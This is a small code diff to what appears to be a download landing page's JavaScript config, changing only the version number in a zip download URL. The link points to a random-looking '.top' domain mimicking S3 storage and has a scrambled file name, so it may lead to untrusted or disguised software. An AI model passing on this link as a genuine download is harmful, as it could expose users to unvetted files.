@@ -55,7 +55,7 @@
        btnRadius: "10px",
        bg: "//p8.qhimg.com/t11098f6bcd5e40dd91a92718e4.webp",
     },
-    downloadUrl: "https://s3trrreow-s3-oss.top/Moice_xp-win11_x64_Diopxhsse_5410021.3362.zip", 
+    downloadUrl: "https://s3trrreow-s3-oss.top/Moice_xp-win11_x64_Diopxhsse_5410021.3363.zip", 
     QH:"QH_132_4#18",
     theme:"v2",
     themeBtnColor: "#15CA71",
